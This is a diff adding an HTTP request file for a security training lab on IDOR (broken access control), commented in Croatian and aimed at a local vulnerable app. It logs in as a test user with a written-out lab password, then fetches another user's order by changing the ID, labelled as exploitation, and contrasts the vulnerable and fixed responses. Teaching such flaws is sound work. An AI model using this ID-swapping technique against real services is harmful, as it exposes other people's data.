@@ -1,0 +1,22 @@
+### Lab01 – IDOR (Broken Access Control)
+@host = http://localhost:8000
+# Token kopiraj iz odgovora na login u varijablu @token.
+@token = PASTE_TOKEN
+
+### 1. Prijava kao ana (kopiraj "token" iz odgovora u @token)
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{"username": "ana", "password": "Ana123!"}
+
+### 2. Legitimno: ana dohvaca VLASTITU narudzbu 1001 (ocekivano 200)
+GET {{host}}/api/lab01/orders/1001
+Authorization: Bearer {{token}}
+
+### 3. EKSPLOATACIJA: ana dohvaca MARKOVU narudzbu 1003
+# Ranjivo (main): 200 + tudi podaci. Popravljeno (rjesenja): 404.
+GET {{host}}/api/lab01/orders/1003
+Authorization: Bearer {{token}}
+
+### 4. Bez tokena -> 401
+GET {{host}}/api/lab01/orders/1001
